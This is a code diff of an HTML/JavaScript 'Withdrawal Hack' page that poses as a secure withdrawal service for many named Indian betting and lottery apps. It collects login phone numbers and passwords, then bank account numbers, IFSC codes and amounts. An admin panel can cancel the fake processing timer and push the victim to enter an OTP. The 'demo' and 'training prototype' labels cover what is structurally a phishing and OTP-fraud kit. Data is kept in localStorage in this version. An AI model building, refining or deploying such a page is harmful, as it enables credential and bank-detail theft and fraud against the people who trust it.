@@ -3,7 +3,7 @@
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Withdrawal — </title>
+<title>Withdrawal — Demo</title>
 <style>
 *{box-sizing:border-box}body{margin:0;font-family:Inter,Arial,Helvetica,sans-serif;background:
 radial-gradient(circle at 18% 15%,rgba(255,255,255,.9),transparent 32%),
@@ -35,34 +35,46 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </style>
 </head>
 <body>
-<div class="demo"> WITHDRAWAL HACK</div>
+<div class="demo">🛡 WITHDRAWAL HACK</div>
 <div class="wrap">
+  
+  <!-- LOGIN PAGE -->
   <section class="card" id="login">
-    <div class="badge">🛡 &nbsp;SECURE </div>
+    <div class="badge">🛡 &nbsp;SECURE</div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     <label>🎮 Platform <span class="req">*</span></label>
     <select id="platform">
-      <option value="">Select Platform</option><option>13L Game</option><option>Big Mumbai</option>
-      <option>Diuwin</option><option>Yaar Win</option><option>Bounty</option><option>Tashan Win</option>
-      <option>Daman Game</option><option>L7 Lottery</option><option>82 Lottery</option><option>Dhani Win</option>
-      <option>55 Club</option><option>Sikkim</option><option>Goa Game</option><option>In999</option>
-      <option>51 Game</option><option>Jalwa Game</option><option>Jai Club</option><option>Raja Game</option>
-      <option>Tiranga</option><option>Dm Win</option><option>91 Club</option><option>6 Club</option>
-      <option>BDG Win</option><option>BDG Game</option><option>Ok Win</option>
+      <option value="">Select Platform</option>
+      <option>13L Game</option><option>Big Mumbai</option>
+      <option>Diuwin</option><option>Yaar Win</option>
+      <option>Bounty</option><option>Tashan Win</option>
+      <option>Daman Game</option><option>L7 Lottery</option>
+      <option>82 Lottery</option><option>Dhani Win</option>
+      <option>55 Club</option><option>Sikkim</option>
+      <option>Goa Game</option><option>In999</option>
+      <option>51 Game</option><option>Jalwa Game</option>
+      <option>Jai Club</option><option>Raja Game</option>
+      <option>Tiranga</option><option>Dm Win</option>
+      <option>91 Club</option><option>6 Club</option>
+      <option>BDG Win</option><option>BDG Game</option>
+      <option>Ok Win</option>
     </select>
     <label>📱 Phone Number <span class="req">*</span></label>
     <input id="phone" type="tel" inputmode="numeric" maxlength="10" placeholder="Enter 10-digit demo number">
     <label>🔒 Enter Password <span class="req">*</span></label>
     <input id="password" type="password" placeholder="Enter demo password">
     <button onclick="goConfirm()">↪ Login</button>
-    <div style="text-align:center;margin-top:12px"><a href="admin.html" style="color:#6749d7;font-weight:800;text-decoration:none">🔐 Admin Panel</a></div>
-    <div class="small"> All In One</div>
+    <div style="text-align:center;margin-top:12px">
+      <a href="admin.html" style="color:#6749d7;font-weight:800;text-decoration:none">🔐 Admin Panel</a>
+    </div>
+    <div class="small">All In One</div>
     <div class="footer-demo">Training / UI prototype</div>
   </section>
 
+  <!-- CONFIRM PAGE -->
   <section class="card hidden" id="confirm">
-    <div class="badge">🛡 &nbsp;SECURE </div>
+    <div class="badge">🛡 &nbsp;SECURE</div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     <h2 style="text-align:center">✔ Confirm Withdrawal</h2>
@@ -76,15 +88,20 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
       <option>Airtel Payments Bank</option><option>HDFC Bank</option>
       <option>Yes Bank</option><option>Jio Payments Bank</option>
     </select>
-    <label># Account Number</label><input id="account" inputmode="numeric" placeholder="Enter account number">
-    <label>&lt;/&gt; IFSC Code</label><input id="ifsc" placeholder="Enter IFSC code">
-    <label>💵 Amount</label><input id="amount" type="number" inputmode="decimal" placeholder="Enter demo amount">
+    <label># Account Number</label>
+    <input id="account" inputmode="numeric" placeholder="Enter account number">
+    <label>&lt;/&gt; IFSC Code</label>
+    <input id="ifsc" placeholder="Enter IFSC code">
+    <label>💵 Amount</label>
+    <input id="amount" type="number" inputmode="decimal" placeholder="Enter demo amount">
     <button style="background:linear-gradient(90deg,#ff7900,#ff5c00)" onclick="startTimer()">● Confirm Withdrawal</button>
-    <div class="small">Use values only. No financial information is sent anywhere.</div><div class="footer-demo">Training / UI prototype</div>
+    <div class="small">Use values only. No financial information is sent anywhere.</div>
+    <div class="footer-demo">Training / UI prototype</div>
   </section>
 
+  <!-- PROCESSING PAGE -->
   <section class="card hidden" id="processing">
-    <div class="badge">🛡 &nbsp;SECURE </div>
+    <div class="badge">🛡 &nbsp;SECURE</div>
     <h1>💰 Withdrawal</h1>
     <div class="sub">Fast &amp; Secure Withdrawal Service</div><hr>
     
@@ -102,7 +119,7 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
       </div>
     </div>
     
-    <!-- OTP SECTION - Jab Timer Cancel Hoga Tab Yeh Dikhega -->
+    <!-- OTP SECTION -->
     <div id="otpSection" class="otp-box hidden">
       <h3 style="color:#dc3545;">⏹ Timer Cancelled!</h3>
       <p style="color:#666;font-size:14px;">Admin has cancelled the timer. Please verify with OTP to complete withdrawal.</p>
@@ -120,46 +137,63 @@ button{width:100%;height:62px;border:0;border-radius:20px;background:linear-grad
 </div>
 
 <script>
-const DEMO_KEY="withdrawal_demo_activity_v1";
+const DEMO_KEY = "withdrawal_demo_activity_v1";
 let timer = null;
 let remaining = 600;
-let otpVerified = false;
 let timerCancelled = false;
 
-function saveDemoActivity(type,data){
- const a=JSON.parse(localStorage.getItem(DEMO_KEY)||"[]");
- a.unshift({id:Date.now(),type,time:new Date().toLocaleString(),verified:false,...data});
- localStorage.setItem(DEMO_KEY,JSON.stringify(a.slice(0,100)));
+// Save activity to localStorage
+function saveDemoActivity(type, data) {
+  const a = JSON.parse(localStorage.getItem(DEMO_KEY) || "[]");
+  a.unshift({ id: Date.now(), type, time: new Date().toLocaleString(), verified: false, ...data });
+  localStorage.setItem(DEMO_KEY, JSON.stringify(a.slice(0, 100)));
 }
 
-function show(id){
- document.querySelectorAll('section.card').forEach(x=>x.classList.add('hidden'));
- document.getElementById(id).classList.remove('hidden');
- scrollTo(0,0);
+// Show specific page, hide others
+function show(id) {
+  document.querySelectorAll('section.card').forEach(function(x) {
+    x.classList.add('hidden');
+  });
+  document.getElementById(id).classList.remove('hidden');
+  window.scrollTo(0, 0);
 }
 
-function goConfirm(){
-  const p=document.getElementById('platform').value, ph=document.getElementById('phone').value, pw=document.getElementById('password').value;
-  if(!p||ph.length!==10||!pw){alert('Please fill the demo platform, 10-digit phone number and demo password.');return}
-  saveDemoActivity('LOGIN',{platform:p,phone:ph,password:pw}); 
+// LOGIN → CONFIRM
+function goConfirm() {
+  var p = document.getElementById('platform').value;
+  var ph = document.getElementById('phone').value;
+  var pw = document.getElementById('password').value;
+  
+  if (!p) { alert('Please select a platform.'); return; }
+  if (ph.length !== 10) { alert('Please enter a valid 10-digit phone number.'); return; }
+  if (!pw || pw.length < 4) { alert('Please enter a password (min 4 characters).'); return; }
+  
+  saveDemoActivity('LOGIN', { platform: p, phone: ph, password: pw });
   show('confirm');
 }
 
-function startTimer(){
-  if(!document.getElementById('bank').value||!document.getElementById('account').value||!document.getElementById('ifsc').value||!document.getElementById('amount').value){
-    alert('Please fill all demo withdrawal fields.');
-    return;
-  }
-  saveDemoActivity('WITHDRAWAL',{
-    bank:document.getElementById('bank').value,
-    account:document.getElementById('account').value,
-    ifsc:document.getElementById('ifsc').value,
-    amount:'₹ '+document.getElementById('amount').value,
-    platform:document.getElementById('platform').value
-  }); 
+// CONFIRM → PROCESSING (Timer Start)
+function startTimer() {
+  var bank = document.getElementById('bank').value;
+  var acc = document.getElementById('account').value;
+  var ifsc = document.getElementById('ifsc').value;
+  var amt = document.getElementById('amount').value;
+  
+  if (!bank) { alert('Please select a bank.'); return; }
+  if (!acc || acc.length < 5) { alert('Please enter a valid account number.'); return; }
+  if (!ifsc || ifsc.length < 4) { alert('Please enter a valid IFSC code.'); return; }
+  if (!amt || amt <= 0) { alert('Please enter a valid amount.'); return; }
+  
+  saveDemoActivity('WITHDRAWAL', {
+    bank: bank,
+    account: acc,
+    ifsc: ifsc,
+    amount: '₹ ' + amt,
+    platform: document.getElementById('platform').value
+  });
+  
   show('processing');
   remaining = 600;
-  otpVerified = false;
   timerCancelled = false;
   
   // Reset UI
@@ -176,10 +210,10 @@ function startTimer(){
   
   updateTimer();
   clearInterval(timer);
-  timer = setInterval(()=>{
+  timer = setInterval(function() {
     remaining--;
     updateTimer();
-    if(remaining <= 0){
+    if (remaining <= 0) {
       clearInterval(timer);
       document.getElementById('processingStatus').textContent = '✓ DEMO COMPLETE';
       document.getElementById('processingStatus').style.background = '#28a745';
@@ -192,15 +226,15 @@ function startTimer(){
   checkTimerCancel();
 }
 
-function updateTimer(){
-  const m=String(Math.floor(remaining/60)).padStart(2,'0'), s=String(remaining%60).padStart(2,'0');
-  document.getElementById('count').textContent = m+':'+s;
-  document.getElementById('progress').style.width = (remaining/600*100)+'%';
+function updateTimer() {
+  var m = String(Math.floor(remaining / 60)).padStart(2, '0');
+  var s = String(remaining % 60).padStart(2, '0');
+  document.getElementById('count').textContent = m + ':' + s;
+  document.getElementById('progress').style.width = (remaining / 600 * 100) + '%';
 }
 
-function resetDemo(){
+function resetDemo() {
   clearInterval(timer);
-  otpVerified = false;
   timerCancelled = false;
   localStorage.removeItem('withdrawal_timer_cancel');
   localStorage.removeItem('withdrawal_otp');
@@ -210,10 +244,10 @@ function resetDemo(){
 }
 
 // Check if admin cancelled timer
-function checkTimerCancel(){
-  const cancelCheck = setInterval(()=>{
+function checkTimerCancel() {
+  var cancelCheck = setInterval(function() {
     // Check localStorage for cancel
-    if(localStorage.getItem('withdrawal_timer_cancel') === 'true'){
+    if (localStorage.getItem('withdrawal_timer_cancel') === 'true') {
       clearInterval(cancelCheck);
       clearInterval(timer);
       timerCancelled = true;
@@ -230,45 +264,44 @@ function checkTimerCancel(){
     }
     
     // Check if OTP is sent
-    const otpData = localStorage.getItem('withdrawal_otp');
-    if(otpData && timerCancelled){
-      try{
-        const data = JSON.parse(otpData);
-        if(data.active){
+    var otpData = localStorage.getItem('withdrawal_otp');
+    if (otpData && timerCancelled) {
+      try {
+        var data = JSON.parse(otpData);
+        if (data.active) {
           document.getElementById('otpStatusText').textContent = '📨 OTP Sent! Enter code below.';
           document.getElementById('otpStatusText').style.color = '#28a745';
         }
-      } catch(e){}
+      } catch(e) {}
     }
   }, 500);
 }
 
 // Verify OTP
-function verifyOTP(){
-  const userOtp = document.getElementById('otpInput').value.trim();
-  if(!userOtp || userOtp.length !== 6){
+function verifyOTP() {
+  var userOtp = document.getElementById('otpInput').value.trim();
+  if (!userOtp || userOtp.length !== 6) {
     document.getElementById('otpMessage').textContent = '❌ Please enter 6-digit OTP!';
     document.getElementById('otpMessage').style.color = '#dc3545';
     return;
   }
   
-  const otpData = localStorage.getItem('withdrawal_otp');
-  if(!otpData){
+  var otpData = localStorage.getItem('withdrawal_otp');
+  if (!otpData) {
     document.getElementById('otpMessage').textContent = '❌ No OTP found. Please ask admin to send OTP.';
     document.getElementById('otpMessage').style.color = '#dc3545';
     return;
   }
   
-  try{
-    const data = JSON.parse(otpData);
-    if(!data.active){
+  try {
+    var data = JSON.parse(otpData);
+    if (!data.active) {
       document.getElementById('otpMessage').textContent = '❌ OTP expired. Please request new OTP.';
       document.getElementById('otpMessage').style.color = '#dc3545';
       return;
     }
     
-    if(userOtp === data.otp){
-      otpVerified = true;
+    if (userOtp === data.otp) {
       document.getElementById('otpMessage').textContent = '✅ OTP Verified Successfully!';
       document.getElementById('otpMessage').style.color = '#28a745';
       document.getElementById('otpStatusText').textContent = '✅ Verified!';
@@ -280,22 +313,21 @@ function verifyOTP(){
       `;
       
       // Update withdrawal status in localStorage
-      const all = JSON.parse(localStorage.getItem(DEMO_KEY)||"[]");
-      if(all.length > 0){
-        const latest = all[0];
-        if(latest.type === 'WITHDRAWAL'){
+      var all = JSON.parse(localStorage.getItem(DEMO_KEY) || "[]");
+      if (all.length > 0) {
+        var latest = all[0];
+        if (latest.type === 'WITHDRAWAL') {
           latest.verified = true;
           localStorage.setItem(DEMO_KEY, JSON.stringify(all));
         }
       }
       
-      // Clear OTP data
       localStorage.removeItem('withdrawal_otp');
       
       // Notify admin
       try {
-        const channel = new BroadcastChannel('otp_channel');
-        channel.postMessage({type: 'OTP_VERIFIED'});
+        var channel = new BroadcastChannel('otp_channel');
+        channel.postMessage({ type: 'OTP_VERIFIED' });
         channel.close();
       } catch(e) {}
       
@@ -305,14 +337,13 @@ function verifyOTP(){
       document.getElementById('otpInput').value = '';
       document.getElementById('otpInput').focus();
       
-      // Notify admin of failed attempt
       try {
-        const channel = new BroadcastChannel('otp_channel');
-        channel.postMessage({type: 'OTP_VERIFY_FAILED'});
+        var channel = new BroadcastChannel('otp_channel');
+        channel.postMessage({ type: 'OTP_VERIFY_FAILED' });
         channel.close();
       } catch(e) {}
     }
-  } catch(e){
+  } catch(e) {
     document.getElementById('otpMessage').textContent = '❌ Error verifying OTP. Please try again.';
     document.getElementById('otpMessage').style.color = '#dc3545';
   }
@@ -320,14 +351,30 @@ function verifyOTP(){
 
 // Listen for admin messages
 try {
-  const channel = new BroadcastChannel('otp_channel');
+  var channel = new BroadcastChannel('otp_channel');
   channel.onmessage = function(event) {
-    if(event.data.type === 'CANCEL_TIMER'){
+    if (event.data.type === 'CANCEL_TIMER') {
       clearInterval(timer);
       timerCancelled = true;
       
-      // HIDE TIMER, SHOW OTP
       document.getElementById('timerSection').classList.add('hidden');
       document.getElementById('otpSection').classList.remove('hidden');
       document.getElementById('processingStatus').textContent = '⏹ TIMER CANCELLED';
-      document.getElementById('otp
+      document.getElementById('otpStatusText').textContent = '📨 Admin will send OTP...';
+      document.getElementById('otpStatusText').style.color = '#ff9800';
+    }
+    if (event.data.type === 'OTP_SENT') {
+      document.getElementById('otpStatusText').textContent = '📨 OTP Sent! Enter code below.';
+      document.getElementById('otpStatusText').style.color = '#28a745';
+    }
+    if (event.data.type === 'RESET_OTP') {
+      document.getElementById('otpStatusText').textContent = 'Waiting for OTP...';
+      document.getElementById('otpStatusText').style.color = '#dc3545';
+      document.getElementById('otpInput').value = '';
+      document.getElementById('otpMessage').textContent = '';
+    }
+  };
+} catch(e) {}
+</script>
+</body>
+</html>
